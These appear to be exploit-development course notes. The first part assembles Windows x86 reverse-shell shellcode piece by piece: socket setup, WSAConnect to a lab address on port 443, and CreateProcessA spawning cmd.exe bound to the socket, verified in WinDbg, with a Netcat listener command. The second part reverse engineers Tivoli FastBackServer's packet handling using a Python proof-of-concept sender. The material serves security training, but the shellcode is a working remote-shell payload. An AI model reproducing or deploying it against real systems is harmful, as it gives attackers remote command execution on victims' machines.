The source code of ReactOS tells us that the maximum length of the `szSystemStatus` field is 129 (`WSASYS_STATUS_LEN`, which is `128` plus the `NULL` terminator). (`https://doxygen.reactos.org/dd/d21/winsock2_8h.html#acc8153c87f4d00b6e4570c5d0493b38c`)

Calculate the maximum length of the `WSADATA` structure:

`? 0x2 + 0x2 + 0x2 + 0x2 + 0x4 + 0n256 + 0n1 + 0n128 + 0n1`

```
Evaluate expression: 398 = 0000018e
```

Modify our shellcode and subtract a higher value from `ESP` to account for the structure's size.

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes
...
    " call_wsastartup:                   "  #
    "   mov   eax, esp                  ;"  #   Move ESP to EAX
    "   mov   cx, 0x590                 ;"  #   Move 0x590 to CX
    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
    "   push  eax                       ;"  #   Push lpWSAData
    "   xor   eax, eax                  ;"  #   Null EAX
    "   mov   ax, 0x0202                ;"  #   Move version to AX
    "   push  eax                       ;"  #   Push wVersionRequired
    "   call dword ptr [ebp+0x1C]       ;"  #   Call WSAStartup
```

The `call_wsastartup` function:

- moving the memory address from `ESP`, which we used as a storage location for our resolved symbols, to the `EAX` register.

- stores the `0x590` value in the CX register.

- subtract the value of ECX (`0x590`) from EAX, which stores the stack pointer.

- As part of the call to WSAStartup, the API will populate the WSADATA structure that is currently on the stack. Because of this, we need to ensure that later shellcode instructions do not overwrite the contents of this structure. One way of achieving this is by subtracting an arbitrary value (0x590) from the stack pointer and using that as storage for the structure.

After the SUB operation, we'll push EAX to the stack. The next XOR instruction will zero out EAX and we will move the 0x0202 value to the AX register to act as the wVersionRequired argument.

Finally, we can push this argument to the stack and call WSAStartup.



`r`

```
029700e8 ff551c          call    dword ptr [ebp+1Ch]  ss:0023:02b6fac8={WS2_32!WSAStartup (750825e0)}
```

`dds @esp L2`

```
02b6f670  00000202
02b6f674  02b6f0e8
```

`p`

```
eax=00000000
029700eb 0000            add     byte ptr [eax],al          ds:0023:00000000=??
```

The return value of the function stored in `EAX` is `0`, which indicates a successful call according to the official documentation.

### Calling WSASocket

Invoke the `WSASocketA` API, which is responsible for creating the socket. 

```C
SOCKET WSAAPI WSASocketA(
  int                 af,
  int                 type,
  int                 protocol,
  LPWSAPROTOCOL_INFOA lpProtocolInfo,
  GROUP               g,
  DWORD               dwFlags
);
```

There are 6 arguments required for the call. Most of these arguments have familiar data types such as INT and DWORD, but we'll also find some odd data types within the `lpProtocolInfo` and `g` parameters that require additional review:

- The `af` parameter is the address family used by the socket. `AF_INET` (`2`) corresponds to the IPv4 address family.

- The next parameter, `type`, specifies the socket type as its name implies. Our reverse shell will be going over the TCP, so we need to supply the `SOCK_STREAM` (`1`) argument for the socket type.

- The `protocol` parameter is based on the previous 2 arguments supplied to the function. Set to `IPPROTO_TCP` (`6`).

- The `lpProtocolInfo` parameter seems to require a pointer to the `WSAPROTOCOL_INFO` structure. This parameter can be set to `NULL` (`0x0`). If set to `null`, Winsock will use the first transport-service provider, which matches our other parameters. Because we are using standard protocols in our reverse shell (TCP/IP).

- The `g` parameter. This parameter is used for specifying a socket group ID. Since we are creating a single socket, we can set this value to `NULL` as well.

- The `dwFlags` parameter is used to specify additional socket attributes. Because we do not require any additional attributes for our current shellcode, we will also set this value to `NULL`.


```python
    " call_wsasocketa:                   "  #
    "   xor   eax, eax                  ;"  #   Null EAX
    "   push  eax                       ;"  #   Push dwFlags
    "   push  eax                       ;"  #   Push g
    "   push  eax                       ;"  #   Push lpProtocolInfo
    "   mov   al, 0x06                  ;"  #   Move AL, IPPROTO_TCP
    "   push  eax                       ;"  #   Push protocol
    "   sub   al, 0x05                  ;"  #   Subtract 0x05 from AL, AL = 0x01
    "   push  eax                       ;"  #   Push type
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x02
    "   push  eax                       ;"  #   Push af
    "   call dword ptr [ebp+0x20]       ;"  #   Call WSASocketA
```

Set a breakpoint on the CALL to `WSASocketA`.

`bp 02a500f8`

`g`

```
Breakpoint 0 hit
02a500f8 ff5520          call    dword ptr [ebp+20h]  ss:0023:02c4fe58={WS2_32!WSASocketA (750856d0)}
```

`dds @esp L6`

```
02c4f9ec  00000002
02c4f9f0  00000001
02c4f9f4  00000006
02c4f9f8  00000000
02c4f9fc  00000000
02c4fa00  00000000
```

`p`

```
ModLoad: 73af0000 73b40000   C:\Windows\system32\mswsock.dll
eax=00000180
02a500fb 0000            add     byte ptr [eax],al          ds:0023:00000180=??
```

The return value from is `0x180`.

If the call is unsuccessful, the return value is `INVALID_SOCKET` (`0xFFFF`). Otherwise, the function returns a descriptor referencing the socket.

We have now successfully created a socket by calling the WSASocketA API and obtained a descriptor referencing it in the EAX register.

### Calling WSAConnect

With our socket created, call `WSAConnect`, which establishes a connection between 2 socket applications.

```C
int WSAAPI WSAConnect(
  SOCKET         s,
  const sockaddr *name,
  int            namelen,
  LPWSABUF       lpCallerData,
  LPWSABUF       lpCalleeData,
  LPQOS          lpSQOS,
  LPQOS          lpGQOS
);
```

The 1st parameter is the `SOCKET` type, simply named `s`. This parameter requires a descriptor to an unconnected socket, which is exactly what the previous call to `WSASocketA` returned in the `EAX` register.

The 2nd parameter, a pointer to a `sockaddr` structure. This structure varies depending on the protocol selected. For the IPv4 protocol, use the `sockaddr_in` structure:

```C
typedef struct sockaddr_in {
#if ...
  short          sin_family;
#else
  ADDRESS_FAMILY sin_family;
#endif
  USHORT         sin_port;
  IN_ADDR        sin_addr;
  CHAR           sin_zero[8];
} SOCKADDR_IN, *PSOCKADDR_IN;
```

- The 1st member is `sin_family`, which requires the address family of the transport address. Ensure this value is always set to `AF_INET`.

- The next member is `sin_port`, which as the name implies, specifies the port.

- This is followed by `sin_addr`, a nested structure of the type `IN_ADDR`. This nested structure will store the IP address used to initiate the connection to. We can store the IP address inside a DWORD.

```C
typedef struct in_addr {
  union {
    struct {
      UCHAR s_b1;
      UCHAR s_b2;
      UCHAR s_b3;
      UCHAR s_b4;
    } S_un_b;
    struct {
      USHORT s_w1;
      USHORT s_w2;
    } S_un_w;
    ULONG  S_addr;
  } S_un;
} IN_ADDR, *PIN_ADDR, *LPIN_ADDR;
```

The last member of the `sockaddr_in` structure is `sin_zero`, a size 8 character array. According to the official documentation, this array is reserved for system use, and its contents should be set to `0`.

The `WSAConnect` prototype:

```C
int WSAAPI WSAConnect(
  SOCKET         s,
  const sockaddr *name,
  int            namelen,
  LPWSABUF       lpCallerData,
  LPWSABUF       lpCalleeData,
  LPQOS          lpSQOS,
  LPQOS          lpGQOS
);
```

- The `*name` parameter is a pointer to the `sockaddr_in` structure

- The size of the previously-passed structure as the `namelen` parameter. The size of `sockaddr_in` is `0x10` bytes long.

- `lpCallerData` and `lpCalleeData`, require pointers to user data that will be transferred to and from the other socket. According to the documentation, these parameters are used by legacy protocols and are not supported for TCP/IP. We can set both of these to be `NULL`.

- The `lpSQOS` parameter requires a pointer to the `FLOWSPEC` structure. This structure is used in applications that support quality of service (QoS)6 parameters. This is not the case for our shellcode, so we can set it to `NULL`.

- The `lpGQOS` parameter is reserved and should be set to `NULL`.

Convert the IP address and the port of our Kali machine to the correct format.

`? 0n192`

```
Evaluate expression: 192 = 000000c0
```

`? 0n168`

```
Evaluate expression: 168 = 000000a8
```

`? 0n119`

```
Evaluate expression: 119 = 00000077
```

`? 0n120`

```
Evaluate expression: 120 = 00000078
```

`? 0n443`

```
Evaluate expression: 443 = 000001bb
```

With the hex values of our IP address and port generated, update our shellcode with the call to the `WSAConnect` API:

```python
    " call_wsaconnect:                   "  #
    "   mov   esi, eax                  ;"  #   Move the SOCKET descriptor to ESI
    "   xor   eax, eax                  ;"  #   Null EAX
    "   push  eax                       ;"  #   Push sin_zero[]
    "   push  eax                       ;"  #   Push sin_zero[]
    "   push  0x7877a8c0                ;"  #   Push sin_addr (192.168.119.120)
    "   mov   ax, 0xbb01                ;"  #   Move the sin_port (443) to AX
    "   shl   eax, 0x10                 ;"  #   Left shift EAX by 0x10 bits
    "   add   ax, 0x02                  ;"  #   Add 0x02 (AF_INET) to AX
    "   push  eax                       ;"  #   Push sin_port & sin_family
    "   push  esp                       ;"  #   Push pointer to the sockaddr_in structure
    "   pop   edi                       ;"  #   Store pointer to sockaddr_in in EDI
    "   xor   eax, eax                  ;"  #   Null EAX
    "   push  eax                       ;"  #   Push lpGQOS
    "   push  eax                       ;"  #   Push lpSQOS
    "   push  eax                       ;"  #   Push lpCalleeData
    "   push  eax                       ;"  #   Push lpCallerData
    "   add   al, 0x10                  ;"  #   Set AL to 0x10
    "   push  eax                       ;"  #   Push namelen
    "   push  edi                       ;"  #   Push *name
    "   push  esi                       ;"  #   Push s
    "   call dword ptr [ebp+0x24]       ;"  #   Call WSAConnect
```

The `call_wsaconnect` function starts by saving the socket descriptor to `ESI`.

Using the `SHL` instruction, left-shift the `EAX` value by `0x10` bits and then add `0x02` to the `AX` register. This is done because both the `sin_port` and `sin_family` members are defined as `USHORT`, meaning they are each 2 bytes long. Then we will push the resulting DWORD to the stack, completing the `sockaddr_in` structure. Next, we obtain a pointer to it using the PUSH ESP and POP EDI instructions to use later.

Finally, we push the pointer to the `sockaddr_in` structure, stored in `EDI`, and the socket descriptor from `ESI`.

After all the arguments have been pushed on the stack, we call the API.

Set a breakpoint at the call to `WSAConnect`, and inspect the arguments we pass.

`bp 0235011f`

`g`

```
0235011f ff5524          call    dword ptr [ebp+24h]  ss:0023:0254fd38={WS2_32!WSAConnect (75084d90)}
```

`dds @esp L7`

```
0254f8b4  00000180
0254f8b8  0254f8d0
0254f8bc  00000010
0254f8c0  00000000
0254f8c4  00000000
0254f8c8  00000000
0254f8cc  00000000
```

`dds 0254f8d0 L4`

```
0254f8d0  bb010002
0254f8d4  7877a8c0
0254f8d8  00000000
0254f8dc  00000000
```

We have successfully created the `sockaddr_in` on the stack, and passed the pointer to it as a parameter to `WSAConnect`. The rest of the parameters also seem to have been pushed onto the stack correctly.

### Calling CreateProcessA

Now that we have successfully initiated a connection, find a way to start a `cmd.exe` process and redirect its input and output through our initiated connection.

Use the `CreateProcessA` API to, as its name suggests, create a new process.

```C
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

- `lpApplicationName` parameter must contain a pointer to a string, which represents the application that will be executed. If the parameter is set to `NULL`, the second parameter (`lpCommandLine`) can not be `NULL`, and vice-versa.

This parameter expects a pointer to a string containing the command line to be executed. Our shellcode will use this parameter to run `cmd.exe`.

- The `lpProcessAttributes` and `lpThreadAttributes` parameters, which require pointers to `SECURITY_ATTRIBUTES` type structures. For our shellcode, these parameters can be set to `NULL`.

The following parameter, `bInheritHandles`, expects a `TRUE` (`1`) or `FALSE` (`0`) value. This value determines if the inheritable handles from the Python calling process are inherited by the new process (`cmd.exe`). We'll need to set this value to `TRUE` for our reverse shell.

`bInheritHandles` is followed by the `dwCreationFlags` parameter, which expects various `Process Creation Flags`. If this value is `NULL`, the `cmd.exe` process will use the same flags as the calling process.

The `lpEnvironment` parameter expects a pointer to an environment block. The official documentation indicates that if this parameter is set to `NULL`, it will share the same environment block as the calling process.

`lpCurrentDirectory` allows us to specify the full path to the directory for the process. If we set it to `NULL`, it will use the same path as the current calling process. In our case, `cmd.exe` is added to the PATH, allowing us to launch the executable from any path. However, depending on which process the shellcode runs, this parameter might be required.

The last 2 parameters, `lpStartupInfo` and `lpProcessInformation`, require pointers to `STARTUPINFOA` and `PROCESS_INFORMATION` structures.

Because the `PROCESS_INFORMATION` structure will be populated as part of the API, we only need to know the size of the structure.

On the other hand, the `STARTUPINFOA` structure has to be passed to the API by our shellcode.

```C
typedef struct _STARTUPINFOA {
  DWORD  cb;
  LPSTR  lpReserved;
  LPSTR  lpDesktop;
  LPSTR  lpTitle;
  DWORD  dwX;
  DWORD  dwY;
  DWORD  dwXSize;
  DWORD  dwYSize;
  DWORD  dwXCountChars;
  DWORD  dwYCountChars;
  DWORD  dwFillAttribute;
  DWORD  dwFlags;
  WORD   wShowWindow;
  WORD   cbReserved2;
  LPBYTE lpReserved2;
  HANDLE hStdInput;
  HANDLE hStdOutput;
  HANDLE hStdError;
} STARTUPINFOA, *LPSTARTUPINFOA;
```

We only have to worry about a few members. We can set the remaining members to `NULL`.

The first member is `cb`, which requires the size of the structure. We can easily calculate this value using its publicly available symbols and WinDbg:

`dt STARTUPINFOA`

```
MSVCR120!STARTUPINFOA
   +0x000 cb               : Uint4B
   +0x004 lpReserved       : Ptr32 Char
   +0x008 lpDesktop        : Ptr32 Char
   +0x00c lpTitle          : Ptr32 Char
   +0x010 dwX              : Uint4B
   +0x014 dwY              : Uint4B
   +0x018 dwXSize          : Uint4B
   +0x01c dwYSize          : Uint4B
   +0x020 dwXCountChars    : Uint4B
   +0x024 dwYCountChars    : Uint4B
   +0x028 dwFillAttribute  : Uint4B
   +0x02c dwFlags          : Uint4B
   +0x030 wShowWindow      : Uint2B
   +0x032 cbReserved2      : Uint2B
   +0x034 lpReserved2      : Ptr32 UChar
   +0x038 hStdInput        : Ptr32 Void
   +0x03c hStdOutput       : Ptr32 Void
   +0x040 hStdError        : Ptr32 Void
```

`?? sizeof(STARTUPINFOA)`

```
unsigned int 0x44
```

The 2nd member is `dwFlags`. It determines whether certain members of the `STARTUPINFOA` structure are used when the process creates a window. We'll need to set this member to the `STARTF_USESTDHANDLES` flag to enable the `hStdInput`, `hStdOutput`, and `hStdError` members.

It is worth mentioning that if this flag is specified, the handles of the calling process must be inheritable, and the `bInheritHandles` parameter must be set to `TRUE`.

Because we will set the `STARTF_USESTDHANDLES` flag, we also need to set the members that this flag enables. The official documentation tells us that all of these members accept a handle, which receives input (`hStdInput`), output (`hStdOutput`), and error handling (`hStdError`). To interact with the `cmd.exe` process through our socket, we can specify the socket descriptor obtained from the WSASocketA API call as a handle.

```python
    " create_startupinfoa:               "  #
    "   push  esi                       ;"  #   Push hStdError
    "   push  esi                       ;"  #   Push hStdOutput
    "   push  esi                       ;"  #   Push hStdInput
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push lpReserved2
    "   push  eax                       ;"  #   Push cbReserved2 & wShowWindow
    "   mov   al, 0x80                  ;"  #   Move 0x80 to AL
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   mov   cx, 0x80                  ;"  #   Move 0x80 to CX
    "   add   eax, ecx                  ;"  #   Set EAX to 0x100
    "   push  eax                       ;"  #   Push dwFlags
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push dwFillAttribute
    "   push  eax                       ;"  #   Push dwYCountChars
    "   push  eax                       ;"  #   Push dwXCountChars
    "   push  eax                       ;"  #   Push dwYSize
    "   push  eax                       ;"  #   Push dwXSize
    "   push  eax                       ;"  #   Push dwY
    "   push  eax                       ;"  #   Push dwX
    "   push  eax                       ;"  #   Push lpTitle
    "   push  eax                       ;"  #   Push lpDesktop
    "   push  eax                       ;"  #   Push lpReserved
    "   mov   al, 0x44                  ;"  #   Move 0x44 to AL
    "   push  eax                       ;"  #   Push cb
    "   push  esp                       ;"  #   Push pointer to the STARTUPINFOA structure
    "   pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI
```

The `create_startupinfoa` function is responsible for creating the `STARTUPINFOA` and obtaining a pointer to it for later use.

Next, we push the ESI register, which currently holds our socket descriptor, to the stack three times. This sets the hStdInput, hStdOutput, and hStdError members.

This instruction is followed by pushing two NULL DWORDS setting the lpReserved2, cbReserved2, and wShowWindow members.

Continuing the logic of our function, we set both the AL and CX registers to 0x80, and then add them together, storing the result in EAX. This value is then pushed as the dwFlags member.

The only other parameter not set to NULL is cb, which is set to the structure size (0x44).

As a final step in the create_startupinfoa function, we push the ESP register, which gives us a pointer to the STARTUPINFOA structure on the stack. We then POP that value into EDI.

The next step is to store the "cmd.exe" string and obtain a pointer to it. The assembly instructions required to do that are shown below:

```python
    " create_cmd_string:                 "  #
    "   mov   eax, 0xff9a879b           ;"  #   Move 0xff9a879b into EAX
    "   neg   eax                       ;"  #   Negate EAX, EAX = 00657865
    "   push  eax                       ;"  #   Push part of the "cmd.exe" string
    "   push  0x2e646d63                ;"  #   Push the remainder of the "cmd.exe" string
    "   push  esp                       ;"  #   Push pointer to the "cmd.exe" string
    "   pop   ebx                       ;"  #   Store pointer to the "cmd.exe" string in EBX
```

The assembly instructions from Listing 84 start by moving a negative value into EAX. This instruction is followed by a `NEG` instruction, which will result in the last part of the string including the NULL string terminator. This instruction allows us to avoid the NULL byte in our shellcode.

Finally, we push the rest of the "cmd.exe" string to the stack, and obtain a pointer to it in `EBX` to use later.

Now that we have the `STARTUPINFOA` structure and "cmd.exe" string ready, it's time to set up the arguments and call the function:

```python
    " call_createprocessa:               "  #
    "   mov   eax, esp                  ;"  #   Move ESP to EAX
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   mov   cx, 0x390                 ;"  #   Move 0x390 to CX
    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
    "   push  eax                       ;"  #   Push lpProcessInformation
    "   push  edi                       ;"  #   Push lpStartupInfo
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push lpCurrentDirectory
    "   push  eax                       ;"  #   Push lpEnvironment
    "   push  eax                       ;"  #   Push dwCreationFlags
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE)
    "   push  eax                       ;"  #   Push bInheritHandles
    "   dec   eax                       ;"  #   Null EAX
    "   push  eax                       ;"  #   Push lpThreadAttributes
    "   push  eax                       ;"  #   Push lpProcessAttributes
    "   push  ebx                       ;"  #   Push lpCommandLine
    "   push  eax                       ;"  #   Push lpApplicationName
    "   call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA
```

The call_createprocessa function starts by moving the ESP register to EAX and subtracting 0x390 from it with the help of ECX. This is the same step we took when calling the WSAStartup API, which populated the WSADATA structure. This time, we are using this memory address to store the PROCESS_INFORMATION structure, which will be populated by the API.
Next, we push a pointer to the STARTUPINFOA structure that we previously stored in EDI. This instruction is followed by three NULL DWORDs, setting the next three arguments.

We then increase EAX, making the register contain the value 0x01 (TRUE), and push it as the bInheritHandles argument. Then we decrease the register, setting it back to NULL, and push two NULL DWORDs.

The lpCommandLine, which requires a pointer to a string representing the command to be executed, is pushed on the stack using the EBX register set in a previous step. Finally, we set the lpApplicationName argument to NULL and call the API.

Let's run our updated shellcode and verify the return value of CreateProcessA inside WinDbg by setting a breakpoint right at the call instruction.

Restart our Netcat listener on the Kali machine.

```bash
nc -lvp 443
```

`bp 0294016c`

`g`

```
0294016c ff5518          call    dword ptr [ebp+18h]  ss:0023:02b3f7ac={KERNEL32!CreateProcessAStub (76e68d80)}
```

`p`

```
eax=00000001 ebx=02b3f304 ecx=74517fd6 edx=00000000 esi=00000180 edi=02b3f30c
eip=0294016f esp=02b3f304 ebp=02b3f794 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0294016f 0000            add     byte ptr [eax],al          ds:0023:00000001=??
```

The return value we got is not `NULL`. This indicates that the call was successful.

# Reverse Engineering for Bugs

## Interacting with Tivoli Storage Manager

### Hooking the recv API

`bp wsock32!recv`

`g`

```python
import socket
import sys

buf = bytearray([0x41]*100)

def main():
	if len(sys.argv) != 2:
		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
		sys.exit(1)
	
	server = sys.argv[1]
	port = 11460

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	s.send(buf)
	s.close()

	print("[+] Packet sent")
	sys.exit(0)


if __name__ == "__main__":
 	main()
```

```c
int recv(
  SOCKET s,
  char   *buf,
  int    len,
  int    flags
);
```

`dd esp L5`

```
0d85fb58  00581ae8 00000b6c 00df8058 00004400
0d85fb68  00000000
```

`pt`

```
eax=00000064
WSOCK32!recv+0x5b:
67e71eeb c21000          ret     10h
```

`? 0x64`

```
Evaluate expression: 100 = 00000064
```

The result is `0x64` - decimal value of 100, which is exactly the length of the data we sent.

Dump the content of the input buffer.

`dd 00df8058`

```
00df8058  41414141 41414141 41414141 41414141
00df8068  41414141 41414141 41414141 41414141
00df8078  41414141 41414141 41414141 41414141
00df8088  41414141 41414141 41414141 41414141
00df8098  41414141 41414141 41414141 41414141
00df80a8  41414141 41414141 41414141 41414141
00df80b8  41414141 00000000 00000000 00000000
00df80c8  00000000 00000000 00000000 00000000
```

### Synchronizing WinDbg and IDA Pro

`k`

```
 # ChildEBP RetAddr  
00 0d85fe94 0058164e WSOCK32!recv+0x5b
01 0d85feb0 005815d3 FastBackServer!FX_AGENT_CopyReceiveBuff+0x18
02 0d85fec0 00581320 FastBackServer!FX_AGENT_GetData+0xd
03 0d85fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0xd0
04 0d85ff48 006693e9 FastBackServer!ORABR_Thread+0xef
05 0d85ff80 76f19564 FastBackServer!_beginthreadex+0xf4
06 0d85ff94 7700293c KERNEL32!BaseThreadInitThunk+0x24
07 0d85ffdc 77002910 ntdll!__RtlUserThreadStart+0x2b
08 0d85ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
```

`lm m fastbackserver`

To examine `FastBackServer.exe` in IDA Pro, copy it to our Kali machine.

When loading `FastBackServer.exe` in IDA Pro, we will be prompted for the location of multiple imported DLLs.

Cancel out of these prompts as we won't need these modules for our analysis.

`p`

```
FastBackServer!FX_AGENT_Receive+0x1e2:
00581ae8 8945f8          mov     dword ptr [ebp-8],eax ss:0023:0d6dfe8c=00000001
```

Search in IDA Pro for the `FX_AGENT_Receive` function through `Jump > Jump to function....`.

Right-click any function name to enter a `Quick filter` with the name of the function we are searching for:

```
eax=00000064
FastBackServer!FX_AGENT_Receive+0x1e5:
00581aeb 837df8ff        cmp     dword ptr [ebp-8],0FFFFFFFFh ss:0023:0d85fe8c=00000064
```

`p`

```
FastBackServer!FX_AGENT_Receive+0x1e9:
00581aef 7525            jne     FastBackServer!FX_AGENT_Receive+0x210 (00581b16) [br=1]
```

The instruction ends with `[br=1]` => The branch result before the instruction is executed.

`1` indicates that the jump will be taken (`0` would indicate the opposite condition).

`r zf`

```
zf=0
```

`p`

```
FastBackServer!FX_AGENT_Receive+0x210:
00581b16 837df800        cmp     dword ptr [ebp-8],0  ss:0023:0d85fe8c=00000064
```

`EAX` is compared to `0`. Zero would mean that the `recv` call succeeded but no data was received.

`EAX = 0x64` and the Zero Flag is not set => The jump `jnz` is taken.

```C
char* buf[0x4400];
DWORD result = recv(s,buf,0x4400,0)
if(result != SOCKET_ERROR)
{
  if(result != 0)
  {
    // Do something
  }
}
```

### Checksum, Please

Following the `JNZ`, there is a call to the `PERFMON_S_UpdateCounter` function.

When reverse engineering, not every code path or "rabbit hole" needs to be followed.

Determine if a call is relevant by placing a **hardware breakpoint** on the buffer we are tracing, and then stepping over the call.

- If the breakpoint is not triggered, interpret it as irrelevant and continue.

- If it is triggered, resend our payload and step into the call.

Using a hardware breakpoint triggered by **read** access on our input buffer.

Our input buffer is stored at `0x00df8058`:

```
FastBackServer!FX_AGENT_Receive+0x24a:
00581b50 e826d4f0ff      call    FastBackServer!PERFMON_S_UpdateCounter (0048ef7b)
```

`ba r1 00df8058`

`p`

```
eax=00000001
FastBackServer!FX_AGENT_Receive+0x24f:
00581b55 83c408          add     esp,8
```

`bc *`

Step over the call to `PERFMON_S_UpdateCounter` to find that nothing happened.

=> The code inside the function did not interact with our buffer.

=> Assume that we don't need to trace this call and move forward.

```nasm
call    FastBackServer!PERFMON_S_UpdateCounter
add     esp,8
mov     ecx,dword ptr [ebp+8]
mov     edx,dword ptr [ebp-8]
mov     dword ptr [ecx+28h],edx
mov     eax,1
mov     esp,ebp
pop     ebp
ret
```

`EAX` always acts as the return value for a function.

=>`EAX` being set to `1` => The function succeeded without errors.

The stack pointer is restored, and we return into the calling function, i.e., the function that invoked the `recv` call `FastBackServer!FX_AGENT_Receive` is now complete.

`pt`

```
eax=00000001
FastBackServer!FX_AGENT_Receive+0x263:
00581b69 c3              ret
```

`p`

```
eax=00000001
FastBackServer!FX_AGENT_CopyReceiveBuff+0x18:
0058164e 83c404          add     esp,4
```

We arrive inside the `FX_AGENT_CopyReceiveBuff` function at offset `0x18`.

```nasm
add     esp,4
mov     dword ptr [ebp-8],eax
cmp     dword ptr [ebp-8],0
jnz     FastBackServer!FX_AGENT_CopyReceiveBuff+0x38 (0058166e)
```

If the debugging session is **paused** for an extended period without executing any instructions, the OS can kill the thread with the  message `WARNING: Step/trace thread exited` if we try performing any actions. => Shut down WinDbg and restart our debugging session.

The first conditional branch: Since `EAX` contains the return value of "1", the Zero Flag is not set and the `JNZ` will be taken.

```
eax=00000001
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1e:
00581654 837df800        cmp     dword ptr [ebp-8],0  ss:0023:0d84fea8=00000001
```

To help speed up our reverse engineering process, place a hardware breakpoint on our input buffer and letting the execution continue.

`ba r1 00df8058`

`g`

```
Breakpoint 1 hit
eax=41414141
FastBackServer!memcpy+0x130:
00666f70 89448ffc        mov     dword ptr [edi+ecx*4-4],eax ds:0023:00dfc458=00000000
```

`bc *`

Our breakpoint was hit inside the `memcpy` function. This is a **statically linked** version from the C runtime library.

Dump the call stack => The `memcpy` function was called from the function we are currently reversing.

`k`

```
 # ChildEBP RetAddr  
00 0d85fe8c 005816ea FastBackServer!memcpy+0x130
01 0d85feb0 005815d3 FastBackServer!FX_AGENT_CopyReceiveBuff+0xb4
02 0d85fec0 00581320 FastBackServer!FX_AGENT_GetData+0xd
03 0d85fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0xd0
04 0d85ff48 006693e9 FastBackServer!ORABR_Thread+0xef
05 0d85ff80 76f19564 FastBackServer!_beginthreadex+0xf4
06 0d85ff94 7700293c KERNEL32!BaseThreadInitThunk+0x24
07 0d85ffdc 77002910 ntdll!__RtlUserThreadStart+0x2b
08 0d85ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
```

The address offset shown in the call stack is the **return address**. Based on the size of the `call` instruction, the address of the `call` comes `5` bytes prior:

`u FastBackServer!FX_AGENT_CopyReceiveBuff+0xb4 - 5 L1`

```
FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf:
005816e5 e856570e00      call    FastBackServer!memcpy (00666e40)
```

Return execution to `FX_AGENT_CopyReceiveBuff` just before it performs the copy operation.

Reset our debugging session by removing all breakpoints

`bc *`

Setting a new breakpoint on `FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf`, and re-running our PoC.

`bp FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf`

`g`

```
FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf:
005816e5 e856570e00      call    FastBackServer!memcpy (00666e40)
```

`dd esp L3`

```
0db5fe94  050fc458 050f8058 00000004
```

```C
void *memcpy(void *str1, const void *str2, size_t n)
```

The function copies data from the address of the 2nd argument to the address of the 1st argument.

`dd 050f8058`

```nasm
050f8058  41414141 41414141 41414141 41414141
050f8068  41414141 41414141 41414141 41414141
050f8078  41414141 41414141 41414141 41414141
050f8088  41414141 41414141 41414141 41414141
050f8098  41414141 41414141 41414141 41414141
050f80a8  41414141 41414141 41414141 41414141
050f80b8  41414141 00000000 00000000 00000000
```

`memcpy` will copy the first 4 bytes from our input buffer into a 2nd buffer.

Applications often perform some verification or checksum on the entire input buffer

=> Step over the `memcpy` call and return to IDA Pro to identify the destination buffer.

```nasm
lea     eax,[edx+ecx+4438h]
push    eax
call    FastBackServer!memcpy
add     esp,0Ch
```

The destination buffer is at the static offset `0x4438` from `EDX + ECX` (`050fc458`)

Note down this **offset** to recognize if the destination buffer is used in other basic blocks within the function we are analyzing.

This offset is used in the basic block starting at address `0x581752`.

```nasm
mov     edx,dword ptr [ebp+8]
mov     eax,dword ptr [edx+4438h]
and     eax,0FFh
shl     eax,18h
```

The endianness of the DWORD copied to the destination buffer is switched, i.e. the order of each individual byte is reversed.

Applications often reverse the endianness of data when parsing input. This can be done by calling a function, or directly in-line, as in this case.

`? 0x41414141 & 0xFF`

```
Evaluate expression: 65 = 00000041
```

`? 0x41 << 0x18`

```
Evaluate expression: 1090519040 = 41000000
```

When the calculations are finished, the lowermost byte becomes the uppermost byte. The same process is applied to all 4 bytes by using different shift lengths until the order is reversed.

E.g., For `0x41424344`, the final result would be `0x44434241`.

At the end of the basic block, the modified DWORD stored in `EAX` overwrites the original value in the destination buffer `[ecx+4438h]`.

```nasm
mov     ecx,dword ptr [ebp+8]
mov     dword ptr [ecx+4438h],eax
mov     edx,dword ptr [ebp+8]
cmp     dword ptr [edx+4438h],0
jnz     FastBackServer!FX_AGENT_CopyReceiveBuff+0x18e
```

A comparison is performed between the modified DWORD and the value `0`. If the DWORD is not zero, the execution flow continues to:

```nasm
mov     eax,dword ptr [ebp+8]
cmp     dword ptr [eax+4438h],0
jl      FastBackServer!FX_AGENT_CopyReceiveBuff+0x1a9
```

`JL` is taken when the 1st operand is less than the 2nd, taking into account the sign of the operands (**signed** operation).

The CPU recognizes a value as positive or negative based on its higher-most bit, which is also called the **sign bit**.

Convert the value `0x41414141` to binary:

`.formats 0x41414141`

